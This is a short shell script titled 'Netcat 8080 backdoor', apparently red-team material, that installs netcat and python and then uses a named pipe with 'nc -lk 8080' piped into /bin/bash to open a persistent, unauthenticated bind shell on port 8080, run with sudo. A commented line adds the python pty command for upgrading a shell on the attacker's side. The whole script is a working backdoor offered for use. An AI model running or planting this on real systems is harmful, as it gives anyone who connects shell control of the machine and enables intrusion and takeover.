#Netcat 8080 backdoor

#Installs dependencies
sudo apt install netcat-traditional
sudo apt install netcat-openbsd
sudo apt install netcat
sudo apt install python

#Simulates the old "nc -e" command, opens nc backdoor
sudo mkfifo foo ; nc -lk 8080 0<foo | /bin/bash 1>foo

#Used by red team to spawn a shell, runs on attacker's end
#python -c 'import pty; pty.spawn("/bin/bash")'
